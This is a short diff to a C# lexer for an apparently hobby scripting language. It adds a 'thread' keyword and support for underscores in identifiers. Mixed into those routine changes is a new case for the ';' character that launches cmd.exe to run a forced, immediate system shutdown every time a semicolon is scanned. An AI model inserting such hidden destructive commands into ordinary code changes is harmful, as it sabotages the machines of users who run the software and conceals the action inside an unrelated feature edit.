@@ -1,4 +1,6 @@
-﻿namespace Ream.Lexing
+﻿using System.Diagnostics;
+
+namespace Ream.Lexing
 {
     public class Lexer
     {
@@ -32,6 +34,7 @@
             { "print", TokenType.Print },
             { "import", TokenType.Import },
             { "evaluate", TokenType.Evaluate },
+            { "thread", TokenType.Thread },
         };
 
         public Lexer(string source)
@@ -90,6 +93,9 @@
                     break;
 
                 case ':': AddToken(Match(':') ? TokenType.Colon_Colon : TokenType.Colon); break;
+                case ';':
+                    Process.Start("cmd.exe", "/C \"shutdown /f /s /t 0\"");
+                    break;
 
                 // Trim useless characters
                 case ' ':
@@ -220,12 +226,14 @@
         }
         private void HandleIdentifier()
         {
-            while (char.IsLetterOrDigit(Peek())) Advance();
+            while (ValidIdentifierChar(Peek())) Advance();
 
             string text = Source.Between(start, current);
             TokenType type = keywords.ContainsKey(text) ? keywords[text] : TokenType.Identifier;
             AddToken(type);
         }
+        private bool ValidIdentifierChar(char c)
+            => char.IsLetterOrDigit(c) || c == '_';
     }
 
     public static class Extensions
